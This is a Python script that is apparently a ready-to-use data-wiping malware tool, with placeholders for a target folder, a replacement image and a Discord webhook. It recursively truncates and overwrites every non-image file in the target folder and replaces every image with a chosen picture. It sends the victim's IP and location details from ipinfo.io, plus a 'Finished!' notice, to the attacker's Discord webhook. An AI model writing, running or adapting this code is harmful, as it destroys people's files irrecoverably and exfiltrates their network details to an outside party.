import os
import shutil
import requests
import threading


class Main:
    def __init__(self, directory_name_to_infect: str) -> None:
        self.message = ''''''
        self.picture_formats = (
            '.png',
            '.jpg',
            '.PNG',
            '.JPG',
            '.jpeg',
            '.JPEG',
            '.webp',
            '.WEBP'
        )
        self.directory_name_to_infect = directory_name_to_infect
        self.discord_webhook_url = 'DISCORD_WEBHOOK_HERE'
        self.ip_info = requests.get('https://ipinfo.io').text
        self.picture_directory = os.path.join(os.getcwd(), 'IMAGE_TO_BE_USED')
        # Use an image outside the soon-to-be infected directory

    def files_to_infect(self) -> None:
        if os.path.exists(self.directory_name_to_infect):
            directories = [_dir[0] for _dir in os.walk(self.directory_name_to_infect)]

            for directory in directories:
                files = os.walk(directory).__next__()[2]

                if files.__len__() > 0:
                    for file in files:
                        if not file.endswith(self.picture_formats):
                            path = os.path.join(directory, file)

                            with open(path, 'w+') as infected_file:
                                infected_file.truncate(0)
                                infected_file.write(self.message)

                                print('Infected %s' % file)

    def replace_files(self) -> None:
        if os.path.exists(self.directory_name_to_infect):
            directories = [_dir[0] for _dir in os.walk(self.directory_name_to_infect)]

            for directory in directories:
                files = os.walk(directory).__next__()[2]

                if files.__len__() > 0:
                    for file in files:
                        if file.endswith(self.picture_formats):
                            file_directory = os.path.join(directory, file)
                            shutil.copyfile(self.picture_directory, file_directory)
                            print('Replaced %s with %s' % (file,
                                                           self.picture_directory))

    def big_b00m(self) -> None:
        """
        fuck big bete, BIGB00M
        """
        threads = (
            threading.Thread(target=self.replace_files()),
            threading.Thread(target=self.files_to_infect())
        )

        for thread in threads:
            thread.start()

        self.send_message('Finished!')

    def send_message(self, message_content: str) -> bool:
        payload = {
            'content': f'**```asciidoc\n{message_content}\n```**'
        }

        with requests.Session() as session:
            request = session.post(self.discord_webhook_url,
                                   json=payload)
            if request.status_code == 200:
                return True


if __name__ == '__main__':
    try:
        Main = Main('FOLDER_TO_BE_INFECTED')
        Main.send_message(Main.ip_info)

        Thread_1 = threading.Thread(
            target=Main.big_b00m()
        )
    except KeyboardInterrupt:
        pass
